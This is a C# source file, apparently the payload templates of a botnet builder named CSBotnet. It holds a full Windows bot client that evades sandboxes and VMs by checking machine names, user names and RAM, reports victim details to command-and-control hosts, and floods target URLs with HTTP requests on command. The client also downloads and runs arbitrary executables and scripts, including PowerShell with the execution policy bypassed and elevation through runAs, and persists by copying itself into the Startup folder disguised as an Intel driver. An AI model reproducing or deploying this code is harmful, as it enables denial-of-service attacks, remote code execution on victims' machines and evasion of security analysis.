using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CSBotnet.Server
{
    internal class Payloads
    {
        public class AntiVM
        {
            public static string Script = @"    static async Task AntiVM()
    {
        List<string> BlackListedMachineNames = new List<string>
        {""bee7370c-8c0c-4"", ""desktop-nakffmt"", ""win-5e07cos9alr"", ""b30f0242-1c6a-4"", ""desktop-vrsqlag"", ""q9iatrkprh"", ""xc64zb"", ""desktop-d019gdm"", ""desktop-wi8clet"", ""server1"",
        ""lisa-pc"", ""john-pc"", ""desktop-b0t93d6"", ""desktop-1pykp29"", ""desktop-1y2433r"", ""wileypc"", ""work"", ""6c4e733f-c2d9-4"", ""ralphs-pc"", ""desktop-wg3myjs"", ""desktop-7xc6gez"",
        ""desktop-5ov9s0o"", ""qarzhrdbpj"", ""oreleepc"", ""archibaldpc"", ""julia-pc"", ""d1bnjkfvlh"", ""nettypc"", ""desktop-bugio"", ""desktop-cbgpfee"", ""server-pc"", ""tiqiyla9tw5m"",
        ""desktop-kalvino"", ""compname_4047"", ""desktop-19olltd"", ""desktop-de369se"", ""ea8c2e2a-d017-4"", ""aidanpc"", ""lucas-pc"", ""marci-pc"", ""acepc"", ""mike-pc"", ""desktop-iapkn1p"",
        ""desktop-ntu7vuo"", ""louise-pc"", ""t00917"", ""test42"", ""desktop-et51ajo"", ""DESKTOP-ET51AJO""};

        List<string> BlackListedUserNames = new List<string>
        {""wdagutilityaccount"", ""abby"", ""hmarc"", ""patex"", ""rdhj0cnfevzx"", ""keecfmwgj"", ""frank"", ""8nl0colnq5bq"", ""lisa"", ""john"", ""george"", ""pxmduopvyx"", ""8vizsm"", ""w0fjuovmccp5a"",
        ""lmvwjj9b"", ""pqonjhvwexss"", ""3u2v9m8"", ""julia"", ""heuerzl"", ""fred"", ""server"", ""bvjchrpnsxn"", ""harry johnson"", ""sqgfof3g"", ""lucas"", ""mike"", ""patex"", ""h7dk1xpr"", ""louise"",
        ""user01"", ""test"", ""rgzcbuyrznreg"", ""bruno"", ""george"", ""administrator""};

        if (BlackListedMachineNames.Contains(Environment.MachineName))
        {
            Environment.Exit(0);
        }
        else if (BlackListedUserNames.Contains(Environment.UserName))
        {
            Environment.Exit(0);
        }

        if (Directory.GetFileSystemEntries(Path.GetTempPath()).Length < 20)
        {
            Environment.Exit(0);
        }
        else if (Directory.GetFileSystemEntries(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).Length < 12)
        {
            Environment.Exit(0);
        }

        try
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage Resp = await client.GetAsync(""https://lakaka.gouv"");
            }

            Environment.Exit(0);
        }
        catch
        {

        }

        try
        {
            using (var searcher = new ManagementObjectSearcher(""select TotalPhysicalMemory from Win32_ComputerSystem""))
            {
                ManagementObject mo = searcher.Get().Cast<ManagementObject>().FirstOrDefault();
                if (mo != null)
                {
                    if (ulong.TryParse(mo[""TotalPhysicalMemory""]?.ToString() ?? ""0"", out ulong totalBytes))
                    {
                        if (totalBytes / (1024 * 1024) < 6500)
                        {
                            Environment.Exit(0);
                        }
                    }
                }
            }
        }
        catch
        {

        }
    }";
            public static string Call = "await AntiVM();";
        }

        public class CSProj
        {
            public static string XML = @"<Project Sdk=""Microsoft.NET.Sdk"">

  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <Configuration>Release</Configuration>
    <TargetFramework>net9.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <SelfContained>false</SelfContained>
    <PublishSingleFile>true</PublishSingleFile>
    <PublishSingleFileName>{__FILE_NAME__}</PublishSingleFileName>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include=""System.Management"" Version=""9.0.10"" />
  </ItemGroup>

</Project>";
        }

        public class ClientProgram
        {
            public static string Script = @"using System;
using System.Text;
using System.Text.Json;
using System.Net.Sockets;
using System.Diagnostics;
using System.Security.Principal;
using System.Management;
using System.Reflection;
using System.Security;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] Args)
    {
        bool NotUsed;

        using (Mutex mutex = new Mutex(true, ""{__MUTEX__}"", out NotUsed))
        {

            if (!NotUsed)
            {
                Environment.Exit(0);
            }

            Thread.Sleep({__START_DELAY__});

            {__ANTIVM_CALL__}

            string[] Hosts = { {__C2S__} };;
            int Port = {__PORT__};

            if (Args.Length > 0)
            {
                try
                {
                    Thread.Sleep(Convert.ToInt32(Args[0]));
                }
                catch
                {

                }
            }

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage Resp = await client.GetAsync(""https://csgroup.gov"");

                    if (Resp.IsSuccessStatusCode)
                    {
                        Environment.Exit(0);
                    }

                    Environment.Exit(0);
                }
                catch
                {

                }
            }

            if (Directory.GetFileSystemEntries(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).Length < 10)
            {
                Environment.Exit(0);
            }
            else if (Directory.GetFileSystemEntries(Path.GetTempPath()).Length < 20)
            {
                Environment.Exit(0);
            }

            {__STARTUP_CALL__}

            while (true) 
            {
                foreach (string Host in Hosts)
                {
                    try
                    {
                        int _count = 0;

                        while (_count != 3)
                        {
                            _count++;

                            TcpClient server = null;
                            bool connected = false;

                            while (!connected)
                            {
                                try
                                {
                                    server = new TcpClient();
                                    server.Connect(Host, Port);
                                    connected = true;
                                }
                                catch
                                {
                                    if (server != null)
                                    {
                                        try
                                        {
                                            server.Close();
                                        }
                                        catch { }
                                        server = null;
                                    }
                                    Thread.Sleep({__RECON_DELAY__});
                                }
                            }

                            try
                            {
                                NetworkConfig.Init(Host, Port, server);

                                string IpAddress = ""--"";
                                string? CountryCode = ""--"";
                                string? MachineId = ""--"";

                                try
                                {
                                    MachineId = Utils.GetMachineId();
                                }
                                catch
                                {

                                }

                                if (string.IsNullOrEmpty(MachineId))
                                {
                                    MachineId = ""--"";
                                }

                                try
                                {
                                    IpAddress = await Utils.GetIpAddress();
                                    CountryCode = await Utils.GetCountry(IpAddress);

                                    if (string.IsNullOrEmpty(CountryCode))
                                    {
                                        CountryCode = ""--"";
                                    }
                                }
                                catch
                                {

                                }

                                var Datas = new
                                {
                                    userName = Utils.Username,
                                    machineName = Utils.MachineName,
                                    machineId = MachineId,
                                    ipAddress = IpAddress,
                                    countryCode = CountryCode,
                                    osDetails = Utils.Os,
                                    cpu = Utils.GetCPUModel(),
                                    gpu = Utils.GetGPUModel(),
                                    ram = Utils.GetRAM(),
                                    antiviruses = string.Join("";"", Utils.ListInstalledAntivirus())
                                };

                                string RawJson = JsonSerializer.Serialize(Datas);

                                SendString(NetworkConfig.Stream, ""<NewConnDatas>"" + RawJson);

                                while (true)
                                {
                                    try
                                    {
                                        if (server == null || !server.Connected)
                                        {
                                            throw new Exception(""Connection lost"");
                                        }

                                        string Command = ReceiveString(NetworkConfig.Stream);

                                        if (Command.StartsWith(""<Exit>""))
                                        {
                                            Environment.Exit(0);
                                        }
                                        else if (Command.StartsWith(""<Restart>""))
                                        {
                                            Process Self = new Process();

                                            Self.StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
                                            Self.StartInfo.Arguments = ""3000"";
                                            Self.StartInfo.CreateNoWindow = true;

                                            Self.Start();

                                            Environment.Exit(0);
                                        }
                                        else if (Command.StartsWith(""<Attack>""))
                                        {
                                            Command = Command.Replace(""<Attack>"", """");

                                            string[] Arguments = Command.Split("";"");

                                            string TargetUrl = Arguments[0];
                                            string TargetPort = Arguments[1];
                                            string AttackDuration = Arguments[2];
                                            string ClientId = Arguments[3];

                                            StartAttack(TargetUrl, TargetPort, AttackDuration, ClientId);
                                        }
                                        else if (Command == ""<GetClientInfos>"")
                                        {
                                            try
                                            {
                                                List<string> _Datas = await GetSystemInformations();

                                                SendString(NetworkConfig.Stream, string.Join(""||"", _Datas));
                                            }
                                            catch (Exception ex)
                                            {
                                                SendString(NetworkConfig.Stream, ""<Error>"" + ex.Message);
                                            }
                                        }
                                        else if (Command.StartsWith(""<DlExe>""))
                                        {
                                            string[] Arguments = Command.Replace(""<DlExe>"", """").Split("";"");

                                            string ExecutionArgs = Arguments[3].Trim();

                                            if (ExecutionArgs == ""<NoArgs>"")
                                            {
                                                ExecutionArgs = """";
                                            }

                                            try
                                            {
                                                await Task.Run(() => DlExe(Arguments[0], Arguments[1], ExecutionArgs, bool.Parse(Arguments[2])));
                                            }
                                            catch
                                            {
                                            }
                                        }
                                        else if (Command == ""<Uninstall>"")
                                        {
                                            new Thread(Uninstall).Start();
                                        }
                                    }
                                    catch
                                    {
                                        break;
                                    }
                                }
                            }
                            finally
                            {
                                if (server != null)
                                {
                                    try
                                    {
                                        if (NetworkConfig.Stream != null)
                                        {
                                            NetworkConfig.Stream.Close();
                                            NetworkConfig.Stream = null;
                                        }
                                        server.Close();
                                        server.Dispose();
                                    }
                                    catch { }
                                    server = null;
                                }
                            }
                        }
                    }

                    catch
                    {

                    }
                }
            }
        }
    }

{__ANTIVM_FUNC__}

    static void Uninstall()
    {
        try {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;;
            string exeName = Path.GetFileName(exePath);
            string batPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                ""__uninstall__.bat""
            );

            string script =
        $@""@echo off
:loop
taskkill /f /im """"{exeName}"""" >nul 2>&1
del """"{exePath}"""" >nul 2>&1
if exist """"{exePath}"""" goto loop
del """"{batPath}"""" >nul 2>&1
        "";

            File.WriteAllText(batPath, script);

            Process.Start(new ProcessStartInfo()
            {
                FileName = batPath,
                CreateNoWindow = true,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
        catch {
            Environment.Exit(0);
        }
    }

    static void Attack(string Url, string Port, string Duration, string ClientId)
    {
        Stopwatch timer = new Stopwatch();

        timer.Start();

        bool ReadyToEnd = false;

        using (HttpClient client = new HttpClient())
        {
            while (timer.Elapsed.Seconds < Convert.ToInt32(Duration))
            {

                try
                {
                    client.GetAsync(Url + "":"" + Port);
                }
                catch
                {

                }

                if (!(timer.Elapsed.Seconds <= Convert.ToInt32(Duration)))
                {
                    ReadyToEnd = true;
                    break;
                }
            }
        }

        while (!ReadyToEnd)
        {
            Thread.Sleep(100);
        }

        try
        {
            SendString(NetworkConfig.Stream, $""<StoppedAttacking>FROM:{ClientId}"");
        }
        catch
        {
        }
    }

    static void StartAttack(string Url, string Port, string Duration, string ClientId)
    {
        new Thread(() => Attack(Url, Port, Duration, ClientId)).Start();
    }

{__STARTUP_FUNC__}

    public static async Task DlExe(string FileUrl, string FileName, string Arguments, bool RunAs)
    {
        string DistPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), FileName);

        using (HttpClient client = new HttpClient())
        {
            byte[] RawFile = await client.GetByteArrayAsync(FileUrl);
            File.WriteAllBytes(DistPath, RawFile);
        }

        string extension = Path.GetExtension(FileName).ToLower();
        Process DlExeProc = new Process();
        DlExeProc.StartInfo.CreateNoWindow = true;

        bool useShellExecute = RunAs || extension == "".lnk"" || extension == "".reg"";
        DlExeProc.StartInfo.UseShellExecute = useShellExecute;

        switch (extension)
        {
            case "".exe"":
                DlExeProc.StartInfo.FileName = DistPath;
                DlExeProc.StartInfo.Arguments = Arguments;
                break;

            case "".bat"":
            case "".cmd"":
                DlExeProc.StartInfo.FileName = ""cmd.exe"";
                DlExeProc.StartInfo.Arguments = $""/c \""{DistPath}\"" {Arguments}"";
                break;

            case "".ps"":
            case "".ps1"":
                DlExeProc.StartInfo.FileName = ""powershell.exe"";
                DlExeProc.StartInfo.Arguments = $""-ExecutionPolicy Bypass -File \""{DistPath}\"" {Arguments}"";
                break;

            case "".vbs"":
                DlExeProc.StartInfo.FileName = ""cscript.exe"";
                DlExeProc.StartInfo.Arguments = $""//Nologo \""{DistPath}\"" {Arguments}"";
                break;

            case "".msi"":
                DlExeProc.StartInfo.FileName = ""msiexec.exe"";
                DlExeProc.StartInfo.Arguments = $""/i \""{DistPath}\"" /quiet {Arguments}"";
                DlExeProc.StartInfo.UseShellExecute = true; 
                break;

            case "".lnk"":
                DlExeProc.StartInfo.FileName = DistPath;
                DlExeProc.StartInfo.Arguments = Arguments;
                DlExeProc.StartInfo.UseShellExecute = true;
                break;

            case "".reg"":
                DlExeProc.StartInfo.FileName = ""regedit.exe"";
                DlExeProc.StartInfo.Arguments = $""/s \""{DistPath}\"""";
                DlExeProc.StartInfo.UseShellExecute = true; 
                break;

            case "".scr"":
                DlExeProc.StartInfo.FileName = DistPath;
                DlExeProc.StartInfo.Arguments = Arguments;
                break;

            default:
                DlExeProc.StartInfo.FileName = DistPath;
                DlExeProc.StartInfo.Arguments = Arguments;
                break;
        }

        if (RunAs)
        {
            DlExeProc.StartInfo.UseShellExecute = true;
            DlExeProc.StartInfo.Verb = ""runAs"";
        }

        DlExeProc.Start();
    }

    public static async Task<List<string>> GetSystemInformations()
    {
        var infoList = new List<string>();

        try
        {
            void Add(string name, string value) => infoList.Add($""{name} : {value}"");

            Add(""Username"", Environment.UserName);
            Add(""MachineName"", Environment.MachineName);
            Add(""OSVersion"", Environment.OSVersion.VersionString);
            Add(""Is64BitOS"", Environment.Is64BitOperatingSystem.ToString());
            Add(""ProcessorCount"", Environment.ProcessorCount.ToString());
            Add(""SystemDirectory"", Environment.SystemDirectory);
            Add(""CurrentDirectory"", Environment.CurrentDirectory);
            Add(""CLR Version"", Environment.Version.ToString());

            Add(""CPU Model"", GetWmiProperty(""Win32_Processor"", ""Name""));
            Add(""GPU Model"", GetWmiProperty(""Win32_VideoController"", ""Name""));
            Add(""Total RAM (GB)"", GetTotalRam());
            Add(""Machine UUID"", GetWmiProperty(""Win32_ComputerSystemProduct"", ""UUID""));
            Add(""IsAdministrator"", IsAdmin().ToString());

            string ip = await GetPublicIP();

            Add(""Public IP"", ip);
            Add(""Country"", await GetCountryFromIp(ip));
            Add(""Antiviruses"", string.Join(""; "", GetAntiviruses()));
            Add(""Has Webcam"", HasWebcam().ToString());
        }
        catch (Exception ex)
        {
            infoList.Add($""Error : {ex.Message}"");
        }

        return infoList;
    }

    private static string GetWmiProperty(string wmiClass, string property)
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher($""SELECT {property} FROM {wmiClass}""))
            {
                foreach (ManagementObject obj in searcher.Get())
                    return obj[property]?.ToString() ?? ""Unknown"";
            }
        }
        catch { }
        return ""Unknown"";
    }

    private static string GetTotalRam()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher(""SELECT TotalPhysicalMemory FROM Win32_ComputerSystem""))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    double totalBytes = Convert.ToDouble(obj[""TotalPhysicalMemory""]);
                    double totalGB = Math.Round(totalBytes / (1024 * 1024 * 1024), 2);
                    return totalGB + "" GB"";
                }
            }
        }
        catch { }
        return ""Unknown"";
    }

    private static bool IsAdmin()
    {
        using (var id = WindowsIdentity.GetCurrent())
        {
            var principal = new WindowsPrincipal(id);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    private static async Task<string> GetPublicIP()
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                return await client.GetStringAsync(""https://api.ipify.org"");
            }
        }
        catch { return ""Unknown""; }
    }

    private static async Task<string> GetCountryFromIp(string ip)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                string json = await client.GetStringAsync($""http://ip-api.com/json/{ip}"");
                using (var doc = System.Text.Json.JsonDocument.Parse(json))
                {
                    var root = doc.RootElement;
                    if (root.GetProperty(""status"").GetString() == ""success"")
                        return root.GetProperty(""country"").GetString();
                }
            }
        }
        catch { }
        return ""Unknown"";
    }

    private static List<string> GetAntiviruses()
    {
        List<string> antiviruses = new List<string>();
        try
        {
            using (var searcher = new ManagementObjectSearcher(@""root\SecurityCenter2"", ""SELECT * FROM AntiVirusProduct""))
            {
                foreach (ManagementObject av in searcher.Get())
                    antiviruses.Add(av[""displayName""].ToString());
            }
        }
        catch { antiviruses.Add(""Unknown""); }
        return antiviruses;
    }

    private static bool HasWebcam()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher(""SELECT * FROM Win32_PnPEntity WHERE Description LIKE '%camera%' OR Description LIKE '%webcam%'""))
            {
                foreach (var device in searcher.Get())
                    return true;
            }
        }
        catch { }
        return false;
    }

    static string ReceiveString(NetworkStream stream)
    {
        byte[] buffer = new byte[1024];
        StringBuilder messageBuilder = new StringBuilder();
        int bytesRead;
        bool messageComplete = false;

        while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
        {
            string chunk = Encoding.UTF8.GetString(buffer, 0, bytesRead);
            messageBuilder.Append(chunk);

            if (messageBuilder.ToString().EndsWith(""<End>""))
            {
                messageComplete = true;
                break;
            }
        }

        if (bytesRead == 0 && !messageComplete)
        {
            throw new Exception(""Connection closed by server"");
        }

        string fullMessage = messageBuilder.ToString();
        return fullMessage.Replace(""<End>"", """").Replace(""<PING>"", """");
    }

    static void SendString(NetworkStream stream, string message)
    {
        if (stream == null || !stream.CanWrite)
        {
            throw new Exception(""Cannot send data: stream is null or not writable"");
        }

        try
        {
            string dataToSend = message + ""<End>"";
            byte[] buffer = Encoding.UTF8.GetBytes(dataToSend);
            stream.Write(buffer, 0, buffer.Length);
            stream.Flush();
        }
        catch (Exception ex)
        {
            throw new Exception($""Failed to send data: {ex.Message}"", ex);
        }
    } 
}

public class NetworkConfig
{
    public static NetworkStream Stream;
    public static TcpClient Server;
    public static int Port;
    public static string Host;

    public static void Init(string _Host, int _Port, TcpClient _Server)
    {
        Host = _Host;
        Port = _Port;
        Server = _Server;
        Stream = Server.GetStream();
    }
}

public class Utils
{
    public static string Username = Environment.UserName;
    public static string MachineName = Environment.MachineName;
    public static string Os = Environment.OSVersion.VersionString;

    public static List<string> ListInstalledAntivirus()
    {
        List<string> Antiviruses = new List<string> { };

        try
        {
            string wmiQuery = ""SELECT * FROM AntiVirusProduct"";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@""root\SecurityCenter2"", wmiQuery))
            {
                foreach (ManagementObject av in searcher.Get())
                {
                    Antiviruses.Add(av[""displayName""].ToString());
                }
            }
        }
        catch
        {
        }

        return Antiviruses;
    }

    public static bool HasWebcam()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher(""SELECT * FROM Win32_PnPEntity WHERE Description LIKE '%camera%' OR Description LIKE '%webcam%'""))
            {
                foreach (var device in searcher.Get())
                {
                    return true;
                }
            }
        }
        catch
        {
        }
        return false;
    }

    public static string GetRAM()
    {
        try
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(""select TotalPhysicalMemory from Win32_ComputerSystem""))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    double totalBytes = Convert.ToDouble(obj[""TotalPhysicalMemory""]);
                    double totalGB = Math.Round(totalBytes / (1024 * 1024 * 1024), 2);
                    return totalGB + "" GB"";
                }
            }
        }
        catch { }
        return ""Unknown RAM"";
    }

    public static string GetCPUModel()
    {
        try
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(""select Name from Win32_Processor""))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj[""Name""].ToString();
                }
            }
        }
        catch { }
        return ""Unknown CPU"";
    }
    public static string GetGPUModel()
    {
        try
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(""select Name from Win32_VideoController""))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj[""Name""].ToString();
                }
            }
        }
        catch { }
        return ""Unknown GPU"";
    }
    public static async Task<string> GetIpAddress()
    {
        string IpAddress = ""--"";

        using (HttpClient client = new HttpClient())
        {
            IpAddress = await client.GetStringAsync(""https://api.ipify.org"");
        }

        return IpAddress;
    }

    public static async Task<string?> GetCountry(string IpAddress)
    {
        string RawJson = """";

        using (HttpClient client = new HttpClient())
        {
            RawJson = await client.GetStringAsync($""http://ip-api.com/json/{IpAddress}"");
        }

        JsonDocument json = JsonDocument.Parse(RawJson);
        JsonElement root = json.RootElement;

        string Status = root.GetProperty(""status"").GetString();

        if (Status == ""success"")
        {
            return root.GetProperty(""countryCode"").GetString();
        }
        else
        {
            return null;
        }
    }

    public static bool IsPrivilegedProcess()
    {
        using (WindowsIdentity? winIdentity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal? winPrincipal = new WindowsPrincipal(winIdentity);
            return winPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    public static string? GetMachineId()
    {
        Process WMIC = new Process();

        WMIC.StartInfo.FileName = ""C:\\Windows\\System32\\wbem\\WMIC.exe"";
        WMIC.StartInfo.Arguments = ""csproduct get uuid"";
        WMIC.StartInfo.CreateNoWindow = true;

        WMIC.StartInfo.RedirectStandardOutput = true;

        WMIC.Start();

        string Output = WMIC.StandardOutput.ReadToEnd();

        WMIC.WaitForExit();

        return Output.Split(""\n"")[1].Trim();
    } 
}";
        }

        public class Startup
        {
            public static string Script = @"    static void EnsureStartupInstallation()
    {
        try
        {
            string startupPath = {__STARTUP_SCOPE__};
            string targetFileName = ""Intel® Management Engine Drivers.exe"";
            string targetPath = Path.Combine(startupPath, targetFileName);
            string currentExePath = Process.GetCurrentProcess().MainModule.FileName;

            string currentExeFullPath = Path.GetFullPath(currentExePath);
            string targetFullPath = Path.GetFullPath(targetPath);

            if (currentExeFullPath.Equals(targetFullPath, StringComparison.OrdinalIgnoreCase))
            {
                return;
            }

            if (!File.Exists(targetPath))
            {
                File.Copy(currentExePath, targetPath, true);
            }
        }
        catch
        {
        }
    }";
            public static string Call = "EnsureStartupInstallation();";
        }
    }
}
